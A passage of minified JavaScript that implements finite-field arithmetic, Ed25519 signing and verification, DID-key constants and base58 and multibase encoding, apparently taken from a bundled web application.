                e += t.length
            }
            const t = new Uint8Array(e);
            for (let r = 0, n = 0; r < arguments.length; r++) {
                const e = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                t.set(e, n),
                n += e.length
            }
            return t
        }
        const jr = e => "bigint" == typeof e && vr <= e;
        function zr(e, t, r, n) {
            if (!function(e, t, r) {
                return jr(e) && jr(t) && jr(r) && t <= e && e < r
            }(t, r, n))
                throw new Error("expected valid " + e + ": " + r + " <= n < " + n + ", got " + t)
        }
        const Vr = e => (Tr << BigInt(e - 1)) - wr
          , Hr = {
            bigint: e => "bigint" == typeof e,
            function: e => "function" == typeof e,
            boolean: e => "boolean" == typeof e,
            string: e => "string" == typeof e,
            stringOrUint8Array: e => "string" == typeof e || Ar(e),
            isSafeInteger: e => Number.isSafeInteger(e),
            array: e => Array.isArray(e),
            field: (e, t) => t.Fp.isValid(e),
            hash: e => "function" == typeof e && Number.isSafeInteger(e.outputLen)
        };
        function qr(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
            const n = (t, r, n) => {
                const o = Hr[r];
                if ("function" != typeof o)
                    throw new Error("invalid validator function");
                const i = e[t];
                if ((!n || void 0 !== i) && !o(i, e))
                    throw new Error("param " + String(t) + " is invalid. Expected " + r + ", got " + i)
            }
            ;
            for (const [o,i] of Object.entries(t))
                n(o, i, !1);
            for (const [o,i] of Object.entries(r))
                n(o, i, !0);
            return e
        }
        function Gr(e) {
            const t = new WeakMap;
            return function(r) {
                const n = t.get(r);
                if (void 0 !== n)
                    return n;
                for (var o = arguments.length, i = new Array(o > 1 ? o - 1 : 0), s = 1; s < o; s++)
                    i[s - 1] = arguments[s];
                const a = e(r, ...i);
                return t.set(r, a),
                a
            }
        }
        const $r = BigInt(0)
          , Kr = BigInt(1)
          , Zr = BigInt(2)
          , Yr = BigInt(3)
          , Jr = BigInt(4)
          , Xr = BigInt(5)
          , Qr = BigInt(8);
        function en(e, t) {
            const r = e % t;
            return r >= $r ? r : t + r
        }
        function tn(e, t, r) {
            if (t < $r)
                throw new Error("invalid exponent, negatives unsupported");
            if (r <= $r)
                throw new Error("invalid modulus");
            if (r === Kr)
                return $r;
            let n = Kr;
            for (; t > $r; )
                t & Kr && (n = n * e % r),
                e = e * e % r,
                t >>= Kr;
            return n
        }
        function rn(e, t, r) {
            let n = e;
            for (; t-- > $r; )
                n *= n,
                n %= r;
            return n
        }
        function nn(e, t) {
            if (e === $r)
                throw new Error("invert: expected non-zero number");
            if (t <= $r)
                throw new Error("invert: expected positive modulus, got " + t);
            let r = en(e, t)
              , n = t
              , o = $r
              , i = Kr;
            for (; r !== $r; ) {
                const e = n % r
                  , t = o - i * (n / r);
                n = r,
                r = e,
                o = i,
                i = t
            }
            if (n !== Kr)
                throw new Error("invert: does not exist");
            return en(o, t)
        }
        function on(e) {
            if (e % Jr === Yr) {
                const t = (e + Kr) / Jr;
                return function(e, r) {
                    const n = e.pow(r, t);
                    if (!e.eql(e.sqr(n), r))
                        throw new Error("Cannot find square root");
                    return n
                }
            }
            if (e % Qr === Xr) {
                const t = (e - Xr) / Qr;
                return function(e, r) {
                    const n = e.mul(r, Zr)
                      , o = e.pow(n, t)
                      , i = e.mul(r, o)
                      , s = e.mul(e.mul(i, Zr), o)
                      , a = e.mul(i, e.sub(s, e.ONE));
                    if (!e.eql(e.sqr(a), r))
                        throw new Error("Cannot find square root");
                    return a
                }
            }
            return function(e) {
                const t = (e - Kr) / Zr;
                let r, n, o;
                for (r = e - Kr,
                n = 0; r % Zr === $r; r /= Zr,
                n++)
                    ;
                for (o = Zr; o < e && tn(o, t, e) !== e - Kr; o++)
                    if (o > 1e3)
                        throw new Error("Cannot find square root: likely non-prime P");
                if (1 === n) {
                    const t = (e + Kr) / Jr;
                    return function(e, r) {
                        const n = e.pow(r, t);
                        if (!e.eql(e.sqr(n), r))
                            throw new Error("Cannot find square root");
                        return n
                    }
                }
                const i = (r + Kr) / Zr;
                return function(e, s) {
                    if (e.pow(s, t) === e.neg(e.ONE))
                        throw new Error("Cannot find square root");
                    let a = n
                      , c = e.pow(e.mul(e.ONE, o), r)
                      , l = e.pow(s, i)
                      , u = e.pow(s, r);
                    for (; !e.eql(u, e.ONE); ) {
                        if (e.eql(u, e.ZERO))
                            return e.ZERO;
                        let t = 1;
                        for (let n = e.sqr(u); t < a && !e.eql(n, e.ONE); t++)
                            n = e.sqr(n);
                        const r = e.pow(c, Kr << BigInt(a - t - 1));
                        c = e.sqr(r),
                        l = e.mul(l, r),
                        u = e.mul(u, c),
                        a = t
                    }
                    return l
                }
            }(e)
        }
        const sn = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
        function an(e, t) {
            const r = void 0 !== t ? t : e.toString(2).length;
            return {
                nBitLength: r,
                nByteLength: Math.ceil(r / 8)
            }
        }
        function cn(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2]
              , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
            if (e <= $r)
                throw new Error("invalid field: expected ORDER > 0, got " + e);
            const {nBitLength: o, nByteLength: i} = an(e, t);
            if (i > 2048)
                throw new Error("invalid field: expected ORDER of <= 2048 bytes");
            let s;
            const a = Object.freeze({
                ORDER: e,
                isLE: r,
                BITS: o,
                BYTES: i,
                MASK: Vr(o),
                ZERO: $r,
                ONE: Kr,
                create: t => en(t, e),
                isValid: t => {
                    if ("bigint" != typeof t)
                        throw new Error("invalid field element: expected bigint, got " + typeof t);
                    return $r <= t && t < e
                }
                ,
                is0: e => e === $r,
                isOdd: e => (e & Kr) === Kr,
                neg: t => en(-t, e),
                eql: (e, t) => e === t,
                sqr: t => en(t * t, e),
                add: (t, r) => en(t + r, e),
                sub: (t, r) => en(t - r, e),
                mul: (t, r) => en(t * r, e),
                pow: (e, t) => function(e, t, r) {
                    if (r < $r)
                        throw new Error("invalid exponent, negatives unsupported");
                    if (r === $r)
                        return e.ONE;
                    if (r === Kr)
                        return t;
                    let n = e.ONE
                      , o = t;
                    for (; r > $r; )
                        r & Kr && (n = e.mul(n, o)),
                        o = e.sqr(o),
                        r >>= Kr;
                    return n
                }(a, e, t),
                div: (t, r) => en(t * nn(r, e), e),
                sqrN: e => e * e,
                addN: (e, t) => e + t,
                subN: (e, t) => e - t,
                mulN: (e, t) => e * t,
                inv: t => nn(t, e),
                sqrt: n.sqrt || (t => (s || (s = on(e)),
                s(a, t))),
                invertBatch: e => function(e, t) {
                    const r = new Array(t.length)
                      , n = t.reduce(( (t, n, o) => e.is0(n) ? t : (r[o] = t,
                    e.mul(t, n))), e.ONE)
                      , o = e.inv(n);
                    return t.reduceRight(( (t, n, o) => e.is0(n) ? t : (r[o] = e.mul(t, r[o]),
                    e.mul(t, n))), o),
                    r
                }(a, e),
                cmov: (e, t, r) => r ? t : e,
                toBytes: e => r ? Ur(e, i) : Fr(e, i),
                fromBytes: e => {
                    if (e.length !== i)
                        throw new Error("Field.fromBytes: expected " + i + " bytes, got " + e.length);
                    return r ? Nr(e) : function(e) {
                        return Ir(Sr(e))
                    }(e)
                }
            });
            return Object.freeze(a)
        }
        const ln = BigInt(0)
          , un = BigInt(1);
        function dn(e, t) {
            const r = t.negate();
            return e ? r : t
        }
        function hn(e, t) {
            if (!Number.isSafeInteger(e) || e <= 0 || e > t)
                throw new Error("invalid window size, expected [1.." + t + "], got W=" + e)
        }
        function fn(e, t) {
            hn(e, t);
            return {
                windows: Math.ceil(t / e) + 1,
                windowSize: 2 ** (e - 1)
            }
        }
        const pn = new WeakMap
          , gn = new WeakMap;
        function yn(e) {
            return gn.get(e) || 1
        }
        function mn(e, t, r, n) {
            if (function(e, t) {
                if (!Array.isArray(e))
                    throw new Error("array expected");
                e.forEach(( (e, r) => {
                    if (!(e instanceof t))
                        throw new Error("invalid point at index " + r)
                }
                ))
            }(r, e),
            function(e, t) {
                if (!Array.isArray(e))
                    throw new Error("array of scalars expected");
                e.forEach(( (e, r) => {
                    if (!t.isValid(e))
                        throw new Error("invalid scalar at index " + r)
                }
                ))
            }(n, t),
            r.length !== n.length)
                throw new Error("arrays of points and scalars must have equal length");
            const o = e.ZERO
              , i = function(e) {
                let t;
                for (t = 0; e > vr; e >>= wr,
                t += 1)
                    ;
                return t
            }(BigInt(r.length))
              , s = i > 12 ? i - 3 : i > 4 ? i - 2 : i ? 2 : 1
              , a = (1 << s) - 1
              , c = new Array(a + 1).fill(o);
            let l = o;
            for (let u = Math.floor((t.BITS - 1) / s) * s; u >= 0; u -= s) {
                c.fill(o);
                for (let t = 0; t < n.length; t++) {
                    const e = n[t]
                      , o = Number(e >> BigInt(u) & BigInt(a));
                    c[o] = c[o].add(r[t])
                }
                let e = o;
                for (let t = c.length - 1, r = o; t > 0; t--)
                    r = r.add(c[t]),
                    e = e.add(r);
                if (l = l.add(e),
                0 !== u)
                    for (let t = 0; t < s; t++)
                        l = l.double()
            }
            return l
        }
        function bn(e) {
            return function(e) {
                const t = sn.reduce(( (e, t) => (e[t] = "function",
                e)), {
                    ORDER: "bigint",
                    MASK: "bigint",
                    BYTES: "isSafeInteger",
                    BITS: "isSafeInteger"
                });
                qr(e, t)
            }(e.Fp),
            qr(e, {
                n: "bigint",
                h: "bigint",
                Gx: "field",
                Gy: "field"
            }, {
                nBitLength: "isSafeInteger",
                nByteLength: "isSafeInteger"
            }),
            Object.freeze((0,
            k.A)((0,
            k.A)((0,
            k.A)({}, an(e.n, e.nBitLength)), e), {}, {
                p: e.Fp.ORDER
            }))
        }
        const vn = BigInt(0)
          , wn = BigInt(1)
          , Tn = BigInt(2)
          , An = BigInt(8)
          , En = {
            zip215: !0
        };
        function Pn(e) {
            const t = function(e) {
                const t = bn(e);
                return qr(e, {
                    hash: "function",
                    a: "bigint",
                    d: "bigint",
                    randomBytes: "function"
                }, {
                    adjustScalarBytes: "function",
                    domain: "function",
                    uvRatio: "function",
                    mapToCurve: "function"
                }),
                Object.freeze((0,
                k.A)({}, t))
            }(e)
              , {Fp: r, n: n, prehash: o, hash: i, randomBytes: s, nByteLength: a, h: c} = t
              , l = Tn << BigInt(8 * a) - wn
              , u = r.create
              , d = cn(t.n, t.nBitLength)
              , h = t.uvRatio || ( (e, t) => {
                try {
                    return {
                        isValid: !0,
                        value: r.sqrt(e * r.inv(t))
                    }
                } catch (n) {
                    return {
                        isValid: !1,
                        value: vn
                    }
                }
            }
            )
              , f = t.adjustScalarBytes || (e => e)
              , p = t.domain || ( (e, t, r) => {
                if (Pr("phflag", r),
                t.length || r)
                    throw new Error("Contexts/pre-hash are not supported");
                return e
            }
            );
            function g(e, t) {
                zr("coordinate " + e, t, vn, l)
            }
            function y(e) {
                if (!(e instanceof v))
                    throw new Error("ExtendedPoint expected")
            }
            const m = Gr(( (e, t) => {
                const {ex: n, ey: o, ez: i} = e
                  , s = e.is0();
                null == t && (t = s ? An : r.inv(i));
                const a = u(n * t)
                  , c = u(o * t)
                  , l = u(i * t);
                if (s)
                    return {
                        x: vn,
                        y: wn
                    };
                if (l !== wn)
                    throw new Error("invZ was invalid");
                return {
                    x: a,
                    y: c
                }
            }
            ))
              , b = Gr((e => {
                const {a: r, d: n} = t;
                if (e.is0())
                    throw new Error("bad point: ZERO");
                const {ex: o, ey: i, ez: s, et: a} = e
                  , c = u(o * o)
                  , l = u(i * i)
                  , d = u(s * s)
                  , h = u(d * d)
                  , f = u(c * r);
                if (u(d * u(f + l)) !== u(h + u(n * u(c * l))))
                    throw new Error("bad point: equation left != right (1)");
                if (u(o * i) !== u(s * a))
                    throw new Error("bad point: equation left != right (2)");
                return !0
            }
            ));
            class v {
                constructor(e, t, r, n) {
                    this.ex = e,
                    this.ey = t,
                    this.ez = r,
                    this.et = n,
                    g("x", e),
                    g("y", t),
                    g("z", r),
                    g("t", n),
                    Object.freeze(this)
                }
                get x() {
                    return this.toAffine().x
                }
                get y() {
                    return this.toAffine().y
                }
                static fromAffine(e) {
                    if (e instanceof v)
                        throw new Error("extended point not allowed");
                    const {x: t, y: r} = e || {};
                    return g("x", t),
                    g("y", r),
                    new v(t,r,wn,u(t * r))
                }
                static normalizeZ(e) {
                    const t = r.invertBatch(e.map((e => e.ez)));
                    return e.map(( (e, r) => e.toAffine(t[r]))).map(v.fromAffine)
                }
                static msm(e, t) {
                    return mn(v, d, e, t)
                }
                _setWindowSize(e) {
                    A.setWindowSize(this, e)
                }
                assertValidity() {
                    b(this)
                }
                equals(e) {
                    y(e);
                    const {ex: t, ey: r, ez: n} = this
                      , {ex: o, ey: i, ez: s} = e
                      , a = u(t * s)
                      , c = u(o * n)
                      , l = u(r * s)
                      , d = u(i * n);
                    return a === c && l === d
                }
                is0() {
                    return this.equals(v.ZERO)
                }
                negate() {
                    return new v(u(-this.ex),this.ey,this.ez,u(-this.et))
                }
                double() {
                    const {a: e} = t
                      , {ex: r, ey: n, ez: o} = this
                      , i = u(r * r)
                      , s = u(n * n)
                      , a = u(Tn * u(o * o))
                      , c = u(e * i)
                      , l = r + n
                      , d = u(u(l * l) - i - s)
                      , h = c + s
                      , f = h - a
                      , p = c - s
                      , g = u(d * f)
                      , y = u(h * p)
                      , m = u(d * p)
                      , b = u(f * h);
                    return new v(g,y,b,m)
                }
                add(e) {
                    y(e);
                    const {a: r, d: n} = t
                      , {ex: o, ey: i, ez: s, et: a} = this
                      , {ex: c, ey: l, ez: d, et: h} = e;
                    if (r === BigInt(-1)) {
                        const e = u((i - o) * (l + c))
                          , t = u((i + o) * (l - c))
                          , r = u(t - e);
                        if (r === vn)
                            return this.double();
                        const n = u(s * Tn * h)
                          , f = u(a * Tn * d)
                          , p = f + n
                          , g = t + e
                          , y = f - n
                          , m = u(p * r)
                          , b = u(g * y)
                          , w = u(p * y)
                          , T = u(r * g);
                        return new v(m,b,T,w)
                    }
                    const f = u(o * c)
                      , p = u(i * l)
                      , g = u(a * n * h)
                      , m = u(s * d)
                      , b = u((o + i) * (c + l) - f - p)
                      , w = m - g
                      , T = m + g
                      , A = u(p - r * f)
                      , E = u(b * w)
                      , P = u(T * A)
                      , C = u(b * A)
                      , S = u(w * T);
                    return new v(E,P,S,C)
                }
                subtract(e) {
                    return this.add(e.negate())
                }
                wNAF(e) {
                    return A.wNAFCached(this, e, v.normalizeZ)
                }
                multiply(e) {
                    const t = e;
                    zr("scalar", t, wn, n);
                    const {p: r, f: o} = this.wNAF(t);
                    return v.normalizeZ([r, o])[0]
                }
                multiplyUnsafe(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : v.ZERO;
                    const r = e;
                    return zr("scalar", r, vn, n),
                    r === vn ? T : this.is0() || r === wn ? this : A.wNAFCachedUnsafe(this, r, v.normalizeZ, t)
                }
                isSmallOrder() {
                    return this.multiplyUnsafe(c).is0()
                }
                isTorsionFree() {
                    return A.unsafeLadder(this, n).is0()
                }
                toAffine(e) {
                    return m(this, e)
                }
                clearCofactor() {
                    const {h: e} = t;
                    return e === wn ? this : this.multiplyUnsafe(e)
                }
                static fromHex(e) {
                    let n = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                    const {d: o, a: i} = t
                      , s = r.BYTES;
                    e = Dr("pointHex", e, s),
                    Pr("zip215", n);
                    const a = e.slice()
                      , c = e[s - 1];
                    a[s - 1] = -129 & c;
                    const d = Nr(a)
                      , f = n ? l : r.ORDER;
                    zr("pointHex.y", d, vn, f);
                    const p = u(d * d)
                      , g = u(p - wn)
                      , y = u(o * p - i);
                    let {isValid: m, value: b} = h(g, y);
                    if (!m)
                        throw new Error("Point.fromHex: invalid y coordinate");
                    const w = (b & wn) === wn
                      , T = 0 !== (128 & c);
                    if (!n && b === vn && T)
                        throw new Error("Point.fromHex: x=0 and x_0=1");
                    return T !== w && (b = u(-b)),
                    v.fromAffine({
                        x: b,
                        y: d
                    })
                }
                static fromPrivateKey(e) {
                    return C(e).point
                }
                toRawBytes() {
                    const {x: e, y: t} = this.toAffine()
                      , n = Ur(t, r.BYTES);
                    return n[n.length - 1] |= e & wn ? 128 : 0,
                    n
                }
                toHex() {
                    return Sr(this.toRawBytes())
                }
            }
            v.BASE = new v(t.Gx,t.Gy,wn,u(t.Gx * t.Gy)),
            v.ZERO = new v(vn,wn,wn,vn);
            const {BASE: w, ZERO: T} = v
              , A = function(e, t) {
                return {
                    constTimeNegate: dn,
                    hasPrecomputes: e => 1 !== yn(e),
                    unsafeLadder(t, r) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.ZERO
                          , o = t;
                        for (; r > ln; )
                            r & un && (n = n.add(o)),
                            o = o.double(),
                            r >>= un;
                        return n
                    },
                    precomputeWindow(e, r) {
                        const {windows: n, windowSize: o} = fn(r, t)
                          , i = [];
                        let s = e
                          , a = s;
                        for (let t = 0; t < n; t++) {
                            a = s,
                            i.push(a);
                            for (let e = 1; e < o; e++)
                                a = a.add(s),
                                i.push(a);
                            s = a.double()
                        }
                        return i
                    },
                    wNAF(r, n, o) {
                        const {windows: i, windowSize: s} = fn(r, t);
                        let a = e.ZERO
                          , c = e.BASE;
                        const l = BigInt(2 ** r - 1)
                          , u = 2 ** r
                          , d = BigInt(r);
                        for (let e = 0; e < i; e++) {
                            const t = e * s;
                            let r = Number(o & l);
                            o >>= d,
                            r > s && (r -= u,
                            o += un);
                            const i = t
                              , h = t + Math.abs(r) - 1
                              , f = e % 2 !== 0
                              , p = r < 0;
                            0 === r ? c = c.add(dn(f, n[i])) : a = a.add(dn(p, n[h]))
                        }
                        return {
                            p: a,
                            f: c
                        }
                    },
                    wNAFUnsafe(r, n, o) {
                        let i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : e.ZERO;
                        const {windows: s, windowSize: a} = fn(r, t)
                          , c = BigInt(2 ** r - 1)
                          , l = 2 ** r
                          , u = BigInt(r);
                        for (let e = 0; e < s; e++) {
                            const t = e * a;
                            if (o === ln)
                                break;
                            let r = Number(o & c);
                            if (o >>= u,
                            r > a && (r -= l,
                            o += un),
                            0 === r)
                                continue;
                            let s = n[t + Math.abs(r) - 1];
                            r < 0 && (s = s.negate()),
                            i = i.add(s)
                        }
                        return i
                    },
                    getPrecomputes(e, t, r) {
                        let n = pn.get(t);
                        return n || (n = this.precomputeWindow(t, e),
                        1 !== e && pn.set(t, r(n))),
                        n
                    },
                    wNAFCached(e, t, r) {
                        const n = yn(e);
                        return this.wNAF(n, this.getPrecomputes(n, e, r), t)
                    },
                    wNAFCachedUnsafe(e, t, r, n) {
                        const o = yn(e);
                        return 1 === o ? this.unsafeLadder(e, t, n) : this.wNAFUnsafe(o, this.getPrecomputes(o, e, r), t, n)
                    },
                    setWindowSize(e, r) {
                        hn(r, t),
                        gn.set(e, r),
                        pn.delete(e)
                    }
                }
            }(v, 8 * a);
            function E(e) {
                return en(e, n)
            }
            function P(e) {
                return E(Nr(e))
            }
            function C(e) {
                const t = r.BYTES;
                e = Dr("private key", e, t);
                const n = Dr("hashed private key", i(e), 2 * t)
                  , o = f(n.slice(0, t))
                  , s = n.slice(t, 2 * t)
                  , a = P(o)
                  , c = w.multiply(a)
                  , l = c.toRawBytes();
                return {
                    head: o,
                    prefix: s,
                    scalar: a,
                    point: c,
                    pointBytes: l
                }
            }
            function S() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : new Uint8Array;
                for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                    r[n - 1] = arguments[n];
                const s = Lr(...r);
                return P(i(p(s, Dr("context", e), !!o)))
            }
            const I = En;
            return w._setWindowSize(8),
            {
                CURVE: t,
                getPublicKey: function(e) {
                    return C(e).pointBytes
                },
                sign: function(e, t) {
                    let i = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    e = Dr("message", e),
                    o && (e = o(e));
                    const {prefix: s, scalar: a, pointBytes: c} = C(t)
                      , l = S(i.context, s, e)
                      , u = w.multiply(l).toRawBytes()
                      , d = E(l + S(i.context, u, c, e) * a);
                    return zr("signature.s", d, vn, n),
                    Dr("result", Lr(u, Ur(d, r.BYTES)), 2 * r.BYTES)
                },
                verify: function(e, t, n) {
                    let i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : I;
                    const {context: s, zip215: a} = i
                      , c = r.BYTES;
                    e = Dr("signature", e, 2 * c),
                    t = Dr("message", t),
                    n = Dr("publicKey", n, c),
                    void 0 !== a && Pr("zip215", a),
                    o && (t = o(t));
                    const l = Nr(e.slice(c, 2 * c));
                    let u, d, h;
                    try {
                        u = v.fromHex(n, a),
                        d = v.fromHex(e.slice(0, c), a),
                        h = w.multiplyUnsafe(l)
                    } catch (p) {
                        return !1
                    }
                    if (!a && u.isSmallOrder())
                        return !1;
                    const f = S(s, d.toRawBytes(), u.toRawBytes(), t);
                    return d.add(u.multiplyUnsafe(f)).subtract(h).clearCofactor().equals(v.ZERO)
                },
                ExtendedPoint: v,
                utils: {
                    getExtendedPublicKey: C,
                    randomPrivateKey: () => s(r.BYTES),
                    precompute() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 8
                          , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : v.BASE;
                        return t._setWindowSize(e),
                        t.multiply(BigInt(3)),
                        t
                    }
                }
            }
        }
        BigInt(0),
        BigInt(1);
        const Cn = BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949")
          , Sn = BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");
        BigInt(0);
        const In = BigInt(1)
          , Bn = BigInt(2);
        BigInt(3);
        const xn = BigInt(5)
          , On = BigInt(8);
        function _n(e) {
            return e[0] &= 248,
            e[31] &= 127,
            e[31] |= 64,
            e
        }
        function Wn(e, t) {
            const r = Cn
              , n = en(t * t * t, r)
              , o = function(e) {
                const t = BigInt(10)
                  , r = BigInt(20)
                  , n = BigInt(40)
                  , o = BigInt(80)
                  , i = Cn
                  , s = e * e % i * e % i
                  , a = rn(s, Bn, i) * s % i
                  , c = rn(a, In, i) * e % i
                  , l = rn(c, xn, i) * c % i
                  , u = rn(l, t, i) * l % i
                  , d = rn(u, r, i) * u % i
                  , h = rn(d, n, i) * d % i
                  , f = rn(h, o, i) * h % i
                  , p = rn(f, o, i) * h % i
                  , g = rn(p, t, i) * l % i;
                return {
                    pow_p_5_8: rn(g, Bn, i) * e % i,
                    b2: s
                }
            }(e * en(n * n * t, r)).pow_p_5_8;
            let i = en(e * n * o, r);
            const s = en(t * i * i, r)
              , a = i
              , c = en(i * Sn, r)
              , l = s === e
              , u = s === en(-e, r)
              , d = s === en(-e * Sn, r);
            return l && (i = a),
            (u || d) && (i = c),
            ( (e, t) => (en(e, t) & Kr) === Kr)(i, r) && (i = en(-i, r)),
            {
                isValid: l || u,
                value: i
            }
        }
        const Rn = cn(Cn, void 0, !0)
          , kn = Pn({
            a: BigInt(-1),
            d: BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),
            Fp: Rn,
            n: BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),
            h: On,
            Gx: BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),
            Gy: BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),
            hash: br,
            randomBytes: ar,
            adjustScalarBytes: _n,
            uvRatio: Wn
        })
          , Mn = "EdDSA"
          , Nn = "."
          , Fn = "base64url"
          , Un = "utf8"
          , Dn = "utf8"
          , Ln = "did"
          , jn = "key"
          , zn = "base58btc";
        function Vn(e) {
            return null != globalThis.Buffer ? new Uint8Array(e.buffer,e.byteOffset,e.byteLength) : e
        }
        function Hn() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
            return null != globalThis.Buffer && null != globalThis.Buffer.allocUnsafe ? Vn(globalThis.Buffer.allocUnsafe(e)) : new Uint8Array(e)
        }
        function qn(e, t) {
            t || (t = e.reduce(( (e, t) => e + t.length), 0));
            const r = Hn(t);
            let n = 0;
            for (const o of e)
                r.set(o, n),
                n += o.length;
            return Vn(r)
        }
        var Gn = function(e, t) {
            if (e.length >= 255)
                throw new TypeError("Alphabet too long");
            for (var r = new Uint8Array(256), n = 0; n < r.length; n++)
                r[n] = 255;
            for (var o = 0; o < e.length; o++) {
                var i = e.charAt(o)
                  , s = i.charCodeAt(0);
                if (255 !== r[s])
                    throw new TypeError(i + " is ambiguous");
                r[s] = o
            }
            var a = e.length
              , c = e.charAt(0)
              , l = Math.log(a) / Math.log(256)
              , u = Math.log(256) / Math.log(a);
            function d(e) {
                if ("string" != typeof e)
                    throw new TypeError("Expected String");
                if (0 === e.length)
                    return new Uint8Array;
                var t = 0;
                if (" " !== e[t]) {
                    for (var n = 0, o = 0; e[t] === c; )
                        n++,
                        t++;
                    for (var i = (e.length - t) * l + 1 >>> 0, s = new Uint8Array(i); e[t]; ) {
                        var u = r[e.charCodeAt(t)];
                        if (255 === u)
                            return;
                        for (var d = 0, h = i - 1; (0 !== u || d < o) && -1 !== h; h--,
                        d++)
                            u += a * s[h] >>> 0,
                            s[h] = u % 256 >>> 0,
                            u = u / 256 >>> 0;
                        if (0 !== u)
                            throw new Error("Non-zero carry");
                        o = d,
                        t++
                    }
                    if (" " !== e[t]) {
                        for (var f = i - o; f !== i && 0 === s[f]; )
                            f++;
                        for (var p = new Uint8Array(n + (i - f)), g = n; f !== i; )
                            p[g++] = s[f++];
                        return p
                    }
                }
            }
            return {
                encode: function(t) {
                    if (t instanceof Uint8Array || (ArrayBuffer.isView(t) ? t = new Uint8Array(t.buffer,t.byteOffset,t.byteLength) : Array.isArray(t) && (t = Uint8Array.from(t))),
                    !(t instanceof Uint8Array))
                        throw new TypeError("Expected Uint8Array");
                    if (0 === t.length)
                        return "";
                    for (var r = 0, n = 0, o = 0, i = t.length; o !== i && 0 === t[o]; )
                        o++,
                        r++;
                    for (var s = (i - o) * u + 1 >>> 0, l = new Uint8Array(s); o !== i; ) {
                        for (var d = t[o], h = 0, f = s - 1; (0 !== d || h < n) && -1 !== f; f--,
                        h++)
                            d += 256 * l[f] >>> 0,
                            l[f] = d % a >>> 0,
                            d = d / a >>> 0;
                        if (0 !== d)
                            throw new Error("Non-zero carry");
                        n = h,
                        o++
                    }
                    for (var p = s - n; p !== s && 0 === l[p]; )
                        p++;
                    for (var g = c.repeat(r); p < s; ++p)
                        g += e.charAt(l[p]);
                    return g
                },
                decodeUnsafe: d,
                decode: function(e) {
                    var r = d(e);
                    if (r)
                        return r;
                    throw new Error("Non-".concat(t, " character"))
                }
            }
        }
          , $n = Gn;
        const Kn = e => {
            if (e instanceof Uint8Array && "Uint8Array" === e.constructor.name)
                return e;
            if (e instanceof ArrayBuffer)
                return new Uint8Array(e);
            if (ArrayBuffer.isView(e))
                return new Uint8Array(e.buffer,e.byteOffset,e.byteLength);
            throw new Error("Unknown type, must be binary type")
        }
        ;
        class Zn {
            constructor(e, t, r) {
                this.name = e,
                this.prefix = t,
                this.baseEncode = r
            }
            encode(e) {
                if (e instanceof Uint8Array)
                    return "".concat(this.prefix).concat(this.baseEncode(e));
                throw Error("Unknown type, must be binary type")
            }
        }
        class Yn {
            constructor(e, t, r) {
                if (this.name = e,
                this.prefix = t,
                void 0 === t.codePointAt(0))
                    throw new Error("Invalid prefix character");
                this.prefixCodePoint = t.codePointAt(0),
                this.baseDecode = r
            }
            decode(e) {
                if ("string" == typeof e) {
                    if (e.codePointAt(0) !== this.prefixCodePoint)
                        throw Error("Unable to decode multibase string ".concat(JSON.stringify(e), ", ").concat(this.name, " decoder only supports inputs prefixed with ").concat(this.prefix));
                    return this.baseDecode(e.slice(this.prefix.length))
                }
                throw Error("Can only multibase decode strings")
            }
            or(e) {
                return Xn(this, e)
            }
        }
        class Jn {
            constructor(e) {
                this.decoders = e
            }
            or(e) {
                return Xn(this, e)
            }
            decode(e) {
                const t = e[0]
                  , r = this.decoders[t];
                if (r)
                    return r.decode(e);
                throw RangeError("Unable to decode multibase string ".concat(JSON.stringify(e), ", only inputs prefixed with ").concat(Object.keys(this.decoders), " are supported"))
            }
        }
        const Xn = (e, t) => new Jn((0,
        k.A)((0,
        k.A)({}, e.decoders || {
            [e.prefix]: e
        }), t.decoders || {
            [t.prefix]: t
        }));
        class Qn {
            constructor(e, t, r, n) {
                this.name = e,
                this.prefix = t,
                this.baseEncode = r,
                this.baseDecode = n,
                this.encoder = new Zn(e,t,r),
                this.decoder = new Yn(e,t,n)
            }
            encode(e) {
                return this.encoder.encode(e)
            }
            decode(e) {
                return this.decoder.decode(e)
            }
        }
        const eo = e => {
            let {name: t, prefix: r, encode: n, decode: o} = e;
            return new Qn(t,r,n,o)
        }
          , to = e => {
            let {prefix: t, name: r, alphabet: n} = e;
            const {encode: o, decode: i} = $n(n, r);
            return eo({
                prefix: t,
                name: r,
                encode: o,
                decode: e => Kn(i(e))
            })
        }
          , ro = e => {
            let {name: t, prefix: r, bitsPerChar: n, alphabet: o} = e;
            return eo({
                prefix: r,
                name: t,
                encode: e => ( (e, t, r) => {
                    const n = "=" === t[t.length - 1]
                      , o = (1 << r) - 1;
                    let i = ""
                      , s = 0
                      , a = 0;
                    for (let c = 0; c < e.length; ++c)
                        for (a = a << 8 | e[c],
                        s += 8; s > r; )
                            s -= r,
                            i += t[o & a >> s];
                    if (s && (i += t[o & a << r - s]),
                    n)
                        for (; i.length * r & 7; )
                            i += "=";
                    return i
                }
                )(e, o, n),
                decode: e => ( (e, t, r, n) => {
                    const o = {};
                    for (let u = 0; u < t.length; ++u)
                        o[t[u]] = u;
                    let i = e.length;
                    for (; "=" === e[i - 1]; )
                        --i;
                    const s = new Uint8Array(i * r / 8 | 0);
                    let a = 0
                      , c = 0
                      , l = 0;
